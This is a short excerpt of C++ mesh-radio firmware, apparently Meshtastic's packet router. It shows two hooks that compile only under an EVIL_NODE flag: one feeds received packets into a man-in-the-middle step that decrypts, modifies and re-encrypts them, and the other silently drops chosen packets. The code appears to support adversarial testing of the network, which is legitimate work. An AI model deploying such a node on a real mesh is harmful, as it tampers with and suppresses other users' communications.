...
void Router::handleReceived(meshtastic_MeshPacket *p, RxSource src)
{
    ...
    if (!skipHandle) {
#ifdef EVIL_NODE
        // Evil node: decrypt-modify-re-encrypt MitM pipeline.
        // Transform the decoded payload before modules see it and before
        // re-encryption happens in Router::send() → perhapsEncode().
        // Only applied to packets from remote nodes (not our own transmissions).
        if (src == RX_SRC_RADIO)
            EvilNode::transformPacket(p);
#endif
...
#ifdef EVIL_NODE
    // Evil node: selective packet dropping (by node ID, channel, or random rate)
    if (EvilNode::shouldDrop(p)) {
        packetPool.release(p);
        return;
    }
#endif
